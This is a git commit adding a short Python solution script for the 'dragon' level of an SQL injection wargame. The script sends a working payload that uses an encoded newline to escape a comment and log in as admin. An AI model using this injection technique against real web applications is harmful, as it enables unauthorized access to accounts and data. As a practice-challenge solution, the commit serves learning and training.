4c1b3fa300376fa6b7cadc35a39fd68d51eb2613
thisisyoobi <75841024+thisisyoobi@users.noreply.github.com>
2024-01-22 22:00:10 +0900

    dragon clear

---
+++ LOS/20_dragon/ex.py
@@ -0,0 +1,23 @@
+#!/usr/bin/env python3
+
+'''
+# Summary
+- The # (%23) only ignore the one line, we can use %0a to make it two lines
+'''
+
+
+import requests
+
+header = {"Cookie": "PHPSESSID=❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚;"}
+url = "https://los.rubiya.kr/chall/dragon_51996aa769df79afbf79eb4d66dbcef6.php"
+
+payload = "?pw=%0a and 1=2 or id='admin"
+
+response = requests.get(url + payload, headers=header)
+
+result = response.text
+if result.find("Clear!") != -1:
+    end = result.split("Clear!")[0].split("<h2>")[1]
+    if end.find("admin") != -1:
+        end = result.split("Clear!")[0].split("<h2>")[2]
+    print(end+"Clear!")
